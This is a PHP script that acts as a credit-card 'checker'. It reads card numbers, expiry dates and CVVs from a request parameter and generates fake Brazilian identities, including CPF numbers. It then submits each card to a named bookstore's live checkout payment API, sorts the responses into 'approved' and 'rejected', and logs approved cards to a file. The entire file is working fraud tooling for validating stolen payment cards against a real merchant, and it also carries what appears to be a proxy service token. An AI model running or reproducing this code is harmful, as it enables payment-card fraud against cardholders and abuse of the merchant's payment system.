<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

/*function getProxy($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch, CURLOPT_COOKIE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, como Gecko) Chrome / 42.0.2311.135 Safari / 537.36 Edge / 12.246");
  $retorno = curl_exec($ch);
  curl_close($ch);
  $json = json_decode($retorno);
  $proxy = $json -> ip;
  $porta = $json -> port;
  return $proxy.':'.$porta;
}

$proxy = getProxy('https://api.proxyorbit.com/v1/?token=mu2WXRrLBNjG7VB2whaNwTak2y2ceQdjGAsPq7lS8bE');*/

//KEY
$key == GetStr($comeco, '<input name="form_key" type="hidden" value="', '"');

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=br');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];


//4devs.php

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$nome = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
//$email = mt_rand();
//TOKEN DO SITE
//$token = GetStr($result, "localStorage.setItem('abandoned_token', '", "'");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://livrariashalom.org/rest/default/V1/guest-carts/40f83b3569965f2780a5a82d28a95ad6/payment-information');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: livrariashalom.org',
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/json',
'Origin: https://livrariashalom.org',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Referer: https://livrariashalom.org/checkout/',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"40f83b3569965f2780a5a82d28a95ad6","billingAddress":{"countryId":"BR","regionId":"507","regionCode":"SC","region":"Santa Catarina","street":["Rua Olga Mussi Dietrich","98","Casa","Dom Bosco"],"telephone":"(47)3247-3641","postcode":"88307-050","city":"Itajaí","firstname":"'.$name.'","lastname":"farias","vatId":"'.$cpf.'","saveInAddressBook":null},"paymentMethod":{"method":"cielo_cc","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_type":"ELO","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_number":"'.$cc.'","cc_owner":"'.$name.'","cc_parcelas":"01","cc_dob":"05/08/1992"}},"email":"'.$email.'"}');
$resultado = curl_exec($ch);

include("consultabin.php");
$bin = "$bandeira $banco $level $pais ($paiscode)";
if (strpos($resultado, 'Transa\u00e7\u00e3o n\u00e3o autorizada. Viola\u00e7\u00e3o de seguran\u00e7a.')) {
$abrir = fopen("521ddcf86847e9db06fc5edcc1fe83b0.txt", "a+");
	fwrite($abrir, "Aprovada $cc|$mes|$ano | $bandeira | $level | $banco | $pais | RETORNO: VIOLAÇÃO DE SEGURANÇA | #ESPINDOLA.FRAMEWORK\n");
	fclose($abrir);
   
    echo "</span> <span class='badge badge-success'>✔ Aprovada</span> <span class='badge badge-secondary'> ".$cc."|".$mes."|".$ano."|".$cvv." </span> <span class='badge badge-dark'> ".$bin."</span><span class='badge badge-warning'>Retorno:</span> ➔ </span><span class='badge badge-warning'> Violação de Segurança </span> ".$msg." </span> ➔</span><span class='badge badge-dark'>@espindola.network</span><br>";
    
 }elseif(strpos($resultado, 'Um erro ocorreu junto ao m\u00e9todo de pagamento, verifique se digitou os dados corretamente ou tente novamente mais tarde.')){
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin.' </span> <span class="badge badge-info"> RETORNO: Ocorreu um erro na sua ordem.</span></span>';
}elseif (strpos($resultado, 'Unable to save address. Please check input data')) {

    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin.' </span> <span class="badge badge-info"> RETORNO: Falhou ao gerar o pedido...</span></span>';
}elseif (strpos($resultado, 'Não foi possível processar a transação. reveja os dados informados e tente novamente. Se o erro persistir, entre em contato com seu banco emissor.')) {
    
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin.' </span> <span class="badge badge-info"> RETORNO: Não foi possível processar a transação. reveja os dados informados e tente novamente. Se o erro persistir, entre em contato com seu banco emissor.</span></span>';

}elseif (strpos($resultado, 'Transa\u00e7\u00e3o Inv\u00e1lida Verique Seus Dados de Pagamento')) {
    
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin.' </span> <span class="badge badge-info"> RETORNO: Transação não autorizada.</span></span>';

}elseif (strpos($resultado, 'Dayly user sending quota sending')) {
    
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin.' </span> <span class="badge badge-info"> RETORNO: Se o erro persistir, gate caiu.</span></span>';
}else{
    echo '<span class="badge badge-dark">✖️ Reprovada  </span> <span class="badge badge-danger"> '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' '.$bin.' </span> <span class="badge badge-info"> RETORNO: Erro não identificado.</span></span>';

}
exit();  

if(file_exists(getcwd().'/cookie.txt')){
   unlink('cookie.txt');
}

deletaCookie();

?>